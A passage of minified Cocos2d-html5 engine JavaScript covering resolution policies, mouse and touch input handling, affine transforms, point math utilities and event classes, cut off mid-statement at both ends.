					d = cc._canvas.height,
					e = d / b.height;
				return this._buildResult(c, d, c, d, e, e)
			},
			postApply: function(a) {
				cc.director._winSizeInPoints = a.getVisibleSize()
			}
		}),
		e = cc.ContentStrategy.extend({
			apply: function(a, b) {
				var c = cc._canvas.width,
					d = cc._canvas.height,
					e = c / b.width;
				return this._buildResult(c, d, c, d, e, e)
			},
			postApply: function(a) {
				cc.director._winSizeInPoints = a.getVisibleSize()
			}
		});
	cc.ContentStrategy.EXACT_FIT = new a;
	cc.ContentStrategy.SHOW_ALL = new b;
	cc.ContentStrategy.NO_BORDER = new c;
	cc.ContentStrategy.FIXED_HEIGHT = new d;
	cc.ContentStrategy.FIXED_WIDTH = new e
})();
cc.ResolutionPolicy = cc.Class.extend({
	_containerStrategy: null,
	_contentStrategy: null,
	ctor: function(a, b) {
		this.setContainerStrategy(a);
		this.setContentStrategy(b)
	},
	preApply: function(a) {
		this._containerStrategy.preApply(a);
		this._contentStrategy.preApply(a)
	},
	apply: function(a, b) {
		this._containerStrategy.apply(a, b);
		return this._contentStrategy.apply(a, b)
	},
	postApply: function(a) {
		this._containerStrategy.postApply(a);
		this._contentStrategy.postApply(a)
	},
	setContainerStrategy: function(a) {
		a instanceof cc.ContainerStrategy && (this._containerStrategy = a)
	},
	setContentStrategy: function(a) {
		a instanceof cc.ContentStrategy && (this._contentStrategy = a)
	}
});
cc.ResolutionPolicy.EXACT_FIT = 0;
cc.ResolutionPolicy.NO_BORDER = 1;
cc.ResolutionPolicy.SHOW_ALL = 2;
cc.ResolutionPolicy.FIXED_HEIGHT = 3;
cc.ResolutionPolicy.FIXED_WIDTH = 4;
cc.ResolutionPolicy.UNKNOWN = 5;
cc.UIInterfaceOrientationLandscapeLeft = -90;
cc.UIInterfaceOrientationLandscapeRight = 90;
cc.UIInterfaceOrientationPortraitUpsideDown = 180;
cc.UIInterfaceOrientationPortrait = 0;
cc.inputManager = {
	_mousePressed: !1,
	_isRegisterEvent: !1,
	_preTouchPoint: cc.p(0, 0),
	_prevMousePoint: cc.p(0, 0),
	_preTouchPool: [],
	_preTouchPoolPointer: 0,
	_touches: [],
	_touchesIntegerDict: {},
	_indexBitsUsed: 0,
	_maxTouches: 5,
	_accelEnabled: !1,
	_accelInterval: 1 / 30,
	_accelMinus: 1,
	_accelCurTime: 0,
	_acceleration: null,
	_accelDeviceEvent: null,
	_getUnUsedIndex: function() {
		for (var a = this._indexBitsUsed, b = 0; b < this._maxTouches; b++) {
			if (!(a & 1)) return this._indexBitsUsed |= 1 << b, b;
			a >>= 1
		}
		return -1
	},
	_removeUsedIndexBit: function(a) {
		0 > a || a >= this._maxTouches || (a = ~ (1 << a), this._indexBitsUsed &= a)
	},
	_glView: null,
	handleTouchesBegin: function(a) {
		for (var b, c, d, e = [], f = this._touchesIntegerDict, g = 0, h = a.length; g < h; g++) b = a[g], d = b.getID(), c = f[d], null == c && (c = this._getUnUsedIndex(), -1 == c ? cc.log(cc._LogInfos.inputManager_handleTouchesBegin, c) : (b = this._touches[c] = b, f[d] = c, e.push(b)));
		0 < e.length && (this._glView._convertTouchesWithScale(e), a = new cc.EventTouch(e), a._eventCode = cc.EventTouch.EventCode.BEGAN, cc.eventManager.dispatchEvent(a))
	},
	handleTouchesMove: function(a) {
		for (var b, c, d = [], e = this._touches, f = 0, g = a.length; f < g; f++) b = a[f], c = b.getID(), c = this._touchesIntegerDict[c], null != c && e[c] && (e[c]._setPoint(b._point), e[c]._setPrevPoint(b._prevPoint), d.push(e[c]));
		0 < d.length && (this._glView._convertTouchesWithScale(d), a = new cc.EventTouch(d), a._eventCode = cc.EventTouch.EventCode.MOVED, cc.eventManager.dispatchEvent(a))
	},
	handleTouchesEnd: function(a) {
		a = this.getSetOfTouchesEndOrCancel(a);
		0 < a.length && (this._glView._convertTouchesWithScale(a), a = new cc.EventTouch(a), a._eventCode = cc.EventTouch.EventCode.ENDED, cc.eventManager.dispatchEvent(a))
	},
	handleTouchesCancel: function(a) {
		a = this.getSetOfTouchesEndOrCancel(a);
		0 < a.length && (this._glView._convertTouchesWithScale(a), a = new cc.EventTouch(a), a._eventCode = cc.EventTouch.EventCode.CANCELLED, cc.eventManager.dispatchEvent(a))
	},
	getSetOfTouchesEndOrCancel: function(a) {
		for (var b, c, d, e = [], f = this._touches, g = this._touchesIntegerDict, h = 0, k = a.length; h < k; h++) b = a[h], d = b.getID(), c = g[d], null != c && f[c] && (f[c]._setPoint(b._point), f[c]._setPrevPoint(b._prevPoint), e.push(f[c]), this._removeUsedIndexBit(c), delete g[d]);
		return e
	},
	getHTMLElementPosition: function(a) {
		var b = document.documentElement,
			c = window,
			d = null,
			d = "function" === typeof a.getBoundingClientRect ? a.getBoundingClientRect() : a instanceof HTMLCanvasElement ? {
				left: 0,
				top: 0,
				width: a.width,
				height: a.height
			} : {
				left: 0,
				top: 0,
				width: parseInt(a.style.width),
				height: parseInt(a.style.height)
			};
		return {
			left: d.left + c.pageXOffset - b.clientLeft,
			top: d.top + c.pageYOffset - b.clientTop,
			width: d.width,
			height: d.height
		}
	},
	getPreTouch: function(a) {
		for (var b = null, c = this._preTouchPool, d = a.getId(), e = c.length - 1; 0 <= e; e--) if (c[e].getId() == d) {
			b = c[e];
			break
		}
		b || (b = a);
		return b
	},
	setPreTouch: function(a) {
		for (var b = !1, c = this._preTouchPool, d = a.getId(), e = c.length - 1; 0 <= e; e--) if (c[e].getId() == d) {
			c[e] = a;
			b = !0;
			break
		}
		b || (50 >= c.length ? c.push(a) : (c[this._preTouchPoolPointer] = a, this._preTouchPoolPointer = (this._preTouchPoolPointer + 1) % 50))
	},
	getTouchByXY: function(a, b, c) {
		var d = this._preTouchPoint;
		a = this._glView.convertToLocationInView(a, b, c);
		b = new cc.Touch(a.x, a.y);
		b._setPrevPoint(d.x, d.y);
		d.x = a.x;
		d.y = a.y;
		return b
	},
	getMouseEvent: function(a, b, c) {
		var d = this._prevMousePoint;
		this._glView._convertMouseToLocationInView(a, b);
		b = new cc.EventMouse(c);
		b.setLocation(a.x, a.y);
		b._setPrevCursor(d.x, d.y);
		d.x = a.x;
		d.y = a.y;
		return b
	},
	getPointByEvent: function(a, b) {
		if (null != a.pageX) return {
			x: a.pageX,
			y: a.pageY
		};
		b.left -= document.body.scrollLeft;
		b.top -= document.body.scrollTop;
		return {
			x: a.clientX,
			y: a.clientY
		}
	},
	getTouchesByEvent: function(a, b) {
		for (var c = [], d = this._glView, e, f, g = this._preTouchPoint, h = a.changedTouches.length, k = 0; k < h; k++) if (e = a.changedTouches[k]) {
			var l;
			l = cc.sys.BROWSER_TYPE_FIREFOX === cc.sys.browserType ? d.convertToLocationInView(e.pageX, e.pageY, b) : d.convertToLocationInView(e.clientX, e.clientY, b);
			null != e.identifier ? (e = new cc.Touch(l.x, l.y, e.identifier), f = this.getPreTouch(e).getLocation(), e._setPrevPoint(f.x, f.y), this.setPreTouch(e)) : (e = new cc.Touch(l.x, l.y), e._setPrevPoint(g.x, g.y));
			g.x = l.x;
			g.y = l.y;
			c.push(e)
		}
		return c
	},
	registerSystemEvent: function(a) {
		if (!this._isRegisterEvent) {
			var b = this._glView = cc.view,
				c = this,
				d = "touches" in cc.sys.capabilities;
			"mouse" in cc.sys.capabilities && (cc._addEventListener(window, "mousedown", function() {
				c._mousePressed = !0
			}, !1), cc._addEventListener(window, "mouseup", function(b) {
				var e = c._mousePressed;
				c._mousePressed = !1;
				if (e) {
					var e = c.getHTMLElementPosition(a),
						f = c.getPointByEvent(b, e);
					cc.rectContainsPoint(new cc.Rect(e.left, e.top, e.width, e.height), f) || (d || c.handleTouchesEnd([c.getTouchByXY(f.x, f.y, e)]), e = c.getMouseEvent(f, e, cc.EventMouse.UP), e.setButton(b.button), cc.eventManager.dispatchEvent(e))

				}
			}, !1), cc._addEventListener(a, "mousedown", function(b) {
				c._mousePressed = !0;
				var e = c.getHTMLElementPosition(a),
					f = c.getPointByEvent(b, e);
				d || c.handleTouchesBegin([c.getTouchByXY(f.x, f.y, e)]);
				e = c.getMouseEvent(f, e, cc.EventMouse.DOWN);
				e.setButton(b.button);
				cc.eventManager.dispatchEvent(e);
				b.stopPropagation();
				b.preventDefault();
				a.focus()
			}, !1), cc._addEventListener(a, "mouseup", function(b) {
				c._mousePressed = !1;
				var e = c.getHTMLElementPosition(a),
					f = c.getPointByEvent(b, e);
				d || c.handleTouchesEnd([c.getTouchByXY(f.x, f.y, e)]);
				e = c.getMouseEvent(f, e, cc.EventMouse.UP);
				e.setButton(b.button);
				cc.eventManager.dispatchEvent(e);
				b.stopPropagation();
				b.preventDefault()
			}, !1), cc._addEventListener(a, "mousemove", function(b) {
				var e = c.getHTMLElementPosition(a),
					f = c.getPointByEvent(b, e);
				d || c.handleTouchesMove([c.getTouchByXY(f.x, f.y, e)]);
				e = c.getMouseEvent(f, e, cc.EventMouse.MOVE);
				c._mousePressed ? e.setButton(b.button) : e.setButton(null);
				cc.eventManager.dispatchEvent(e);
				b.stopPropagation();
				b.preventDefault()
			}, !1), cc._addEventListener(a, "mousewheel", function(b) {
				var d = c.getHTMLElementPosition(a),
					e = c.getPointByEvent(b, d),
					d = c.getMouseEvent(e, d, cc.EventMouse.SCROLL);
				d.setButton(b.button);
				d.setScrollData(0, b.wheelDelta);
				cc.eventManager.dispatchEvent(d);
				b.stopPropagation();
				b.preventDefault()
			}, !1), cc._addEventListener(a, "DOMMouseScroll", function(b) {
				var d = c.getHTMLElementPosition(a),
					e = c.getPointByEvent(b, d),
					d = c.getMouseEvent(e, d, cc.EventMouse.SCROLL);
				d.setButton(b.button);
				d.setScrollData(0, -120 * b.detail);
				cc.eventManager.dispatchEvent(d);
				b.stopPropagation();
				b.preventDefault()
			}, !1));
			if (window.navigator.msPointerEnabled) {
				var e = {
					MSPointerDown: c.handleTouchesBegin,
					MSPointerMove: c.handleTouchesMove,
					MSPointerUp: c.handleTouchesEnd,
					MSPointerCancel: c.handleTouchesCancel
				},
					f;
				for (f in e)(function(b, d) {
					cc._addEventListener(a, b, function(b) {
						var e = c.getHTMLElementPosition(a);
						e.left -= document.documentElement.scrollLeft;
						e.top -= document.documentElement.scrollTop;
						d.call(c, [c.getTouchByXY(b.clientX, b.clientY, e)]);
						b.stopPropagation()
					}, !1)
				})(f, e[f])
			}
			d && (cc._addEventListener(a, "touchstart", function(b) {
				if (b.changedTouches) {
					var d = c.getHTMLElementPosition(a);
					d.left -= document.body.scrollLeft;
					d.top -= document.body.scrollTop;
					c.handleTouchesBegin(c.getTouchesByEvent(b, d));
					b.stopPropagation();
					b.preventDefault();
					a.focus()
				}
			}, !1), cc._addEventListener(a, "touchmove", function(b) {
				if (b.changedTouches) {
					var d = c.getHTMLElementPosition(a);
					d.left -= document.body.scrollLeft;
					d.top -= document.body.scrollTop;
					c.handleTouchesMove(c.getTouchesByEvent(b, d));
					b.stopPropagation();
					b.preventDefault()
				}
			}, !1), cc._addEventListener(a, "touchend", function(b) {
				if (b.changedTouches) {
					var d = c.getHTMLElementPosition(a);
					d.left -= document.body.scrollLeft;
					d.top -= document.body.scrollTop;
					c.handleTouchesEnd(c.getTouchesByEvent(b, d));
					b.stopPropagation();
					b.preventDefault()
				}
			}, !1), cc._addEventListener(a, "touchcancel", function(d) {
				if (d.changedTouches) {
					var e = c.getHTMLElementPosition(a);
					e.left -= document.body.scrollLeft;
					e.top -= document.body.scrollTop;
					b.handleTouchesCancel(c.getTouchesByEvent(d, e));
					d.stopPropagation();
					d.preventDefault()
				}
			}, !1));
			this._registerKeyboardEvent();
			this._registerAccelerometerEvent();
			this._isRegisterEvent = !0
		}
	},
	_registerKeyboardEvent: function() {},
	_registerAccelerometerEvent: function() {},
	update: function(a) {
		this._accelCurTime > this._accelInterval && (this._accelCurTime -= this._accelInterval, cc.eventManager.dispatchEvent(new cc.EventAcceleration(this._acceleration)));
		this._accelCurTime += a
	}
};
cc.AffineTransform = function(a, b, c, d, e, f) {
	this.a = a;
	this.b = b;
	this.c = c;
	this.d = d;
	this.tx = e;
	this.ty = f
};
cc.AffineTransformMake = function(a, b, c, d, e, f) {
	return {
		a: a,
		b: b,
		c: c,
		d: d,
		tx: e,
		ty: f
	}
};
cc.PointApplyAffineTransform = function(a, b) {
	return {
		x: b.a * a.x + b.c * a.y + b.tx,
		y: b.b * a.x + b.d * a.y + b.ty
	}
};
cc._PointApplyAffineTransform = function(a, b, c) {
	return {
		x: c.a * a + c.c * b + c.tx,
		y: c.b * a + c.d * b + c.ty
	}
};
cc.SizeApplyAffineTransform = function(a, b) {
	return {
		width: b.a * a.width + b.c * a.height,
		height: b.b * a.width + b.d * a.height
	}
};
cc.AffineTransformMakeIdentity = function() {
	return {
		a: 1,
		b: 0,
		c: 0,
		d: 1,
		tx: 0,
		ty: 0
	}
};
cc.AffineTransformIdentity = function() {
	return {
		a: 1,
		b: 0,
		c: 0,
		d: 1,
		tx: 0,
		ty: 0
	}
};
cc.RectApplyAffineTransform = function(a, b) {
	var c = cc.rectGetMinY(a),
		d = cc.rectGetMinX(a),
		e = cc.rectGetMaxX(a),
		f = cc.rectGetMaxY(a),
		g = cc._PointApplyAffineTransform(d, c, b),
		c = cc._PointApplyAffineTransform(e, c, b),
		d = cc._PointApplyAffineTransform(d, f, b),
		h = cc._PointApplyAffineTransform(e, f, b),
		e = Math.min(g.x, c.x, d.x, h.x),
		f = Math.max(g.x, c.x, d.x, h.x),
		k = Math.min(g.y, c.y, d.y, h.y),
		g = Math.max(g.y, c.y, d.y, h.y);
	return cc.rect(e, k, f - e, g - k)
};
cc._RectApplyAffineTransformIn = function(a, b) {
	var c = cc.rectGetMinY(a),
		d = cc.rectGetMinX(a),
		e = cc.rectGetMaxX(a),
		f = cc.rectGetMaxY(a),
		g = cc._PointApplyAffineTransform(d, c, b),
		c = cc._PointApplyAffineTransform(e, c, b),
		d = cc._PointApplyAffineTransform(d, f, b),
		h = cc._PointApplyAffineTransform(e, f, b),
		e = Math.min(g.x, c.x, d.x, h.x),
		f = Math.max(g.x, c.x, d.x, h.x),
		k = Math.min(g.y, c.y, d.y, h.y),
		g = Math.max(g.y, c.y, d.y, h.y);
	a.x = e;
	a.y = k;
	a.width = f - e;
	a.height = g - k;
	return a
};
cc.AffineTransformTranslate = function(a, b, c) {
	return {
		a: a.a,
		b: a.b,
		c: a.c,
		d: a.d,
		tx: a.tx + a.a * b + a.c * c,
		ty: a.ty + a.b * b + a.d * c
	}
};
cc.AffineTransformScale = function(a, b, c) {
	return {
		a: a.a * b,
		b: a.b * b,
		c: a.c * c,
		d: a.d * c,
		tx: a.tx,
		ty: a.ty
	}
};
cc.AffineTransformRotate = function(a, b) {
	var c = Math.sin(b),
		d = Math.cos(b);
	return {
		a: a.a * d + a.c * c,
		b: a.b * d + a.d * c,
		c: a.c * d - a.a * c,
		d: a.d * d - a.b * c,
		tx: a.tx,
		ty: a.ty
	}
};
cc.AffineTransformConcat = function(a, b) {
	return {
		a: a.a * b.a + a.b * b.c,
		b: a.a * b.b + a.b * b.d,
		c: a.c * b.a + a.d * b.c,
		d: a.c * b.b + a.d * b.d,
		tx: a.tx * b.a + a.ty * b.c + b.tx,
		ty: a.tx * b.b + a.ty * b.d + b.ty
	}
};
cc.AffineTransformEqualToTransform = function(a, b) {
	return a.a === b.a && a.b === b.b && a.c === b.c && a.d === b.d && a.tx === b.tx && a.ty === b.ty
};
cc.AffineTransformInvert = function(a) {
	var b = 1 / (a.a * a.d - a.b * a.c);
	return {
		a: b * a.d,
		b: -b * a.b,
		c: -b * a.c,
		d: b * a.a,
		tx: b * (a.c * a.ty - a.d * a.tx),
		ty: b * (a.b * a.tx - a.a * a.ty)
	}
};
cc.POINT_EPSILON = parseFloat("1.192092896e-07F");
cc.pNeg = function(a) {
	return cc.p(-a.x, -a.y)
};
cc.pAdd = function(a, b) {
	return cc.p(a.x + b.x, a.y + b.y)
};
cc.pSub = function(a, b) {
	return cc.p(a.x - b.x, a.y - b.y)
};
cc.pMult = function(a, b) {
	return cc.p(a.x * b, a.y * b)
};
cc.pMidpoint = function(a, b) {
	return cc.pMult(cc.pAdd(a, b), 0.5)
};
cc.pDot = function(a, b) {
	return a.x * b.x + a.y * b.y
};
cc.pCross = function(a, b) {
	return a.x * b.y - a.y * b.x
};
cc.pPerp = function(a) {
	return cc.p(-a.y, a.x)
};
cc.pRPerp = function(a) {
	return cc.p(a.y, -a.x)
};
cc.pProject = function(a, b) {
	return cc.pMult(b, cc.pDot(a, b) / cc.pDot(b, b))
};
cc.pRotate = function(a, b) {
	return cc.p(a.x * b.x - a.y * b.y, a.x * b.y + a.y * b.x)
};
cc.pUnrotate = function(a, b) {
	return cc.p(a.x * b.x + a.y * b.y, a.y * b.x - a.x * b.y)
};
cc.pLengthSQ = function(a) {
	return cc.pDot(a, a)
};
cc.pDistanceSQ = function(a, b) {
	return cc.pLengthSQ(cc.pSub(a, b))
};
cc.pLength = function(a) {
	return Math.sqrt(cc.pLengthSQ(a))
};
cc.pDistance = function(a, b) {
	return cc.pLength(cc.pSub(a, b))
};
cc.pNormalize = function(a) {
	return cc.pMult(a, 1 / cc.pLength(a))
};
cc.pForAngle = function(a) {
	return cc.p(Math.cos(a), Math.sin(a))
};
cc.pToAngle = function(a) {
	return Math.atan2(a.y, a.x)
};
cc.clampf = function(a, b, c) {
	if (b > c) {
		var d = b;
		b = c;
		c = d
	}
	return a < b ? b : a < c ? a : c
};
cc.pClamp = function(a, b, c) {
	return cc.p(cc.clampf(a.x, b.x, c.x), cc.clampf(a.y, b.y, c.y))
};
cc.pFromSize = function(a) {
	return cc.p(a.width, a.height)
};
cc.pCompOp = function(a, b) {
	return cc.p(b(a.x), b(a.y))
};
cc.pLerp = function(a, b, c) {
	return cc.pAdd(cc.pMult(a, 1 - c), cc.pMult(b, c))
};
cc.pFuzzyEqual = function(a, b, c) {
	return a.x - c <= b.x && b.x <= a.x + c && a.y - c <= b.y && b.y <= a.y + c ? !0 : !1
};
cc.pCompMult = function(a, b) {
	return cc.p(a.x * b.x, a.y * b.y)
};
cc.pAngleSigned = function(a, b) {
	var c = cc.pNormalize(a),
		d = cc.pNormalize(b),
		c = Math.atan2(c.x * d.y - c.y * d.x, cc.pDot(c, d));
	return Math.abs(c) < cc.POINT_EPSILON ? 0 : c
};
cc.pAngle = function(a, b) {
	var c = Math.acos(cc.pDot(cc.pNormalize(a), cc.pNormalize(b)));
	return Math.abs(c) < cc.POINT_EPSILON ? 0 : c
};
cc.pRotateByAngle = function(a, b, c) {
	a = cc.pSub(a, b);
	var d = Math.cos(c);
	c = Math.sin(c);
	var e = a.x;
	a.x = e * d - a.y * c + b.x;
	a.y = e * c + a.y * d + b.y;
	return a
};
cc.pLineIntersect = function(a, b, c, d, e) {
	if (a.x == b.x && a.y == b.y || c.x == d.x && c.y == d.y) return !1;
	var f = b.x - a.x;
	b = b.y - a.y;
	var g = d.x - c.x;
	d = d.y - c.y;
	var h = a.x - c.x;
	a = a.y - c.y;
	c = d * f - g * b;
	e.x = g * a - d * h;
	e.y = f * a - b * h;
	if (0 == c) return 0 == e.x || 0 == e.y ? !0 : !1;
	e.x /= c;
	e.y /= c;
	return !0
};
cc.pSegmentIntersect = function(a, b, c, d) {
	var e = cc.p(0, 0);
	return cc.pLineIntersect(a, b, c, d, e) && 0 <= e.x && 1 >= e.x && 0 <= e.y && 1 >= e.y ? !0 : !1
};
cc.pIntersectPoint = function(a, b, c, d) {
	var e = cc.p(0, 0);
	return cc.pLineIntersect(a, b, c, d, e) ? (c = cc.p(0, 0), c.x = a.x + e.x * (b.x - a.x), c.y = a.y + e.x * (b.y - a.y), c) : cc.p(0, 0)
};
cc.pSameAs = function(a, b) {
	return null != a && null != b ? a.x == b.x && a.y == b.y : !1
};
cc.pZeroIn = function(a) {
	a.x = 0;
	a.y = 0
};
cc.pIn = function(a, b) {
	a.x = b.x;
	a.y = b.y
};
cc.pMultIn = function(a, b) {
	a.x *= b;
	a.y *= b
};
cc.pSubIn = function(a, b) {
	a.x -= b.x;
	a.y -= b.y
};
cc.pAddIn = function(a, b) {
	a.x += b.x;
	a.y += b.y
};
cc.pNormalizeIn = function(a) {
	cc.pMultIn(a, 1 / Math.sqrt(a.x * a.x + a.y * a.y))
};
cc.Touch = cc.Class.extend({
	_point: null,
	_prevPoint: null,
	_id: 0,
	_startPointCaptured: !1,
	_startPoint: null,
	ctor: function(a, b, c) {
		this._point = cc.p(a || 0, b || 0);
		this._id = c || 0
	},
	getLocation: function() {
		return {
			x: this._point.x,
			y: this._point.y
		}
	},
	getLocationX: function() {
		return this._point.x
	},
	getLocationY: function() {
		return this._point.y
	},
	getPreviousLocation: function() {
		return {
			x: this._prevPoint.x,
			y: this._prevPoint.y
		}
	},
	getStartLocation: function() {
		return {
			x: this._startPoint.x,
			y: this._startPoint.y
		}
	},
	getDelta: function() {
		return cc.pSub(this._point, this._prevPoint)
	},
	getLocationInView: function() {
		return {
			x: this._point.x,
			y: this._point.y
		}
	},
	getPreviousLocationInView: function() {
		return {
			x: this._prevPoint.x,
			y: this._prevPoint.y
		}
	},
	getStartLocationInView: function() {
		return {
			x: this._startPoint.x,
			y: this._startPoint.y
		}
	},
	getID: function() {
		return this._id
	},
	getId: function() {
		return this._id
	},
	setTouchInfo: function(a, b, c) {
		this._prevPoint = this._point;
		this._point = cc.p(b || 0, c || 0);
		this._id = a;
		this._startPointCaptured || (this._startPoint = cc.p(this._point), this._startPointCaptured = !0)
	},
	_setPoint: function(a, b) {
		void 0 === b ? (this._point.x = a.x, this._point.y = a.y) : (this._point.x = a, this._point.y = b)
	},
	_setPrevPoint: function(a, b) {
		this._prevPoint = void 0 === b ? cc.p(a.x, a.y) : cc.p(a || 0, b || 0)
	}
});
cc.Event = cc.Class.extend({
	_type: 0,
	_isStopped: !1,
	_currentTarget: null,
	_setCurrentTarget: function(a) {
		this._currentTarget = a
	},
	ctor: function(a) {
		this._type = a
	},
	getType: function() {
		return this._type
	},
	stopPropagation: function() {
		this._isStopped = !0
	},
	isStopped: function() {
		return this._isStopped
	},
	getCurrentTarget: function() {
		return this._currentTarget
	}
});
cc.Event.TOUCH = 0;
cc.Event.KEYBOARD = 1;
cc.Event.ACCELERATION = 2;
cc.Event.MOUSE = 3;
cc.Event.CUSTOM = 4;
cc.EventCustom = cc.Event.extend({
	_eventName: null,
	_userData: null,
	ctor: function(a) {
		cc.Event.prototype.ctor.call(this, cc.Event.CUSTOM);
		this._eventName = a
	},
	setUserData: function(a) {
		this._userData = a
	},
	getUserData: function() {
		return this._userData
	},
	getEventName: function() {
		return this._eventName
	}
});
cc.EventMouse = cc.Event.extend({
	_eventType: 0,
	_button: 0,
	_x: 0,
	_y: 0,
	_prevX: 0,
	_prevY: 0,
	_scrollX: 0,
	_scrollY: 0,
	ctor: function(a) {
		cc.Event.prototype.ctor.call(this, cc.Event.MOUSE);
		this._eventType = a
	},
	setScrollData: function(a, b) {
		this._scrollX = a;
		this._scrollY = b
	},
	getScrollX: function() {
		return this._scrollX
	},
	getScrollY: function() {
		return this._scrollY
	},
	setLocation: function(a, b) {
		this._x = a;
		this._y = b
	},
	getLocation: function() {
		return {
			x: this._x,
			y: this._y
		}
	},
	getLocationInView: function() {
		return {
			x: this._x,
			y: cc.view._designResolutionSize.height - this._y
		}
	},
	_setPrevCursor: function(a, b) {
		this._prevX = a;
		this._prevY = b
	},
	getDelta: function() {
		return {
			x: this._x - this._prevX,
			y: this._y - this._prevY
		}
	},
	getDeltaX: function() {
		return this._x - this._prevX
	},
	getDeltaY: function() {
		return this._y - this._prevY
	},
	setButton: function(a) {
		this._button = a
	},
	getButton: function() {
		return this._button
	},
	getLocationX: function() {
		return this._x
	},
	getLocationY: function() {
		return this._y
	}
});
cc.EventMouse.NONE = 0;
cc.EventMouse.DOWN = 1;
cc.EventMouse.UP = 2;
cc.EventMouse.MOVE = 3;
cc.EventMouse.SCROLL = 4;
cc.EventMouse.BUTTON_LEFT = 0;
cc.EventMouse.BUTTON_RIGHT = 2;
cc.EventMouse.BUTTON_MIDDLE = 1;
cc.EventMouse.BUTTON_4 = 3;
cc.EventMouse.BUTTON_5 = 4;
cc.EventMouse.BUTTON_6 = 5;
cc.EventMouse.BUTTON_7 = 6;
cc.EventMouse.BUTTON_8 = 7;
cc.EventTouch = cc.Event.extend({
	_eventCode: 0,
	_touches: null,
	ctor: function(a) {
		cc.Event.prototype.ctor.call(this, cc.Event.TOUCH);
		this._touches = a || []
	},
	getEventCode: function() {
		return this._eventCode
	},
	getTouches: function() {
		return this._touches
	},
	_setEventCode: function(a) {
		this._eventCode = a
	},
	_setTouches: function(a) {
		this._touches = a
	}
});
cc.EventTouch.MAX_TOUCHES = 5;
cc.EventTouch.EventCode = {
	BEGAN: 0,
	MOVED: 1,
	ENDED: 2,
	CANCELLED: 3
};
cc.EventListener = cc.Class.extend({
	_onEvent: null,
	_type: 0,
	_listenerID: null,
	_registered: !1,
	_fixedPriority: 0,
	_node: null,
	_paused: !1,
	_isEnabled: !0,
	ctor: function(a, b, c) {
		this._onEvent = c;
		this._type = a || 0;
		this._listenerID = b || ""
	},
	_setPaused: function(a) {
		this._paused = a
	},
	_isPaused: function() {
		return this._paused
	},
	_setRegistered: function(a) {
		this._registered = a
	},
	_isRegistered: function() {
		return this._registered
	},
	_getType: function() {
		return this._type
	},
	_getListenerID: function() {
		return this._listenerID
	},
	_setFixedPriority: function(a) {
		this._fixedPriority = a
	},
	_getFixedPriority: function() {
		return this._fixedPriority
	},
	_setSceneGraphPriority: function(a) {
		this._node = a
	},
	_getSceneGraphPriority: function() {
		return this._node
	},
	checkAvailable: function() {
		return null != this._onEvent
	},
	clone: function() {
		return null
	},
	setEnabled: function(a) {
		this._isEnabled = a
	},
	isEnabled: function() {
		return this._isEnabled
	},
	retain: function() {},
	release: function() {}
});
cc.EventListener.UNKNOWN = 0;
cc.EventListener.TOUCH_ONE_BY_ONE = 1;
cc.EventListener.TOUCH_ALL_AT_ONCE = 2;
cc.EventListener.KEYBOARD = 3;
cc.EventListener.MOUSE = 4;
cc.EventListener.ACCELERATION = 5;
cc.EventListener.CUSTOM = 6;
cc._EventListenerCustom = cc.EventListener.extend({
	_onCustomEvent: null,
	ctor: function(a, b) {
		this._onCustomEvent = b;
		var c = this;
		cc.EventListener.prototype.ctor.call(this, cc.EventListener.CUSTOM, a, function(a) {
			null != c._onCustomEvent && c._onCustomEvent(a)
		})
	},
	checkAvailable: function() {
		return cc.EventListener.prototype.checkAvailable.call(this) && null != this._onCustomEvent
	},
	clone: function() {
		return new cc._EventListenerCustom(this._listenerID, this._onCustomEvent)
	}
});
setTimeout(cc.drawColor.bind(1, 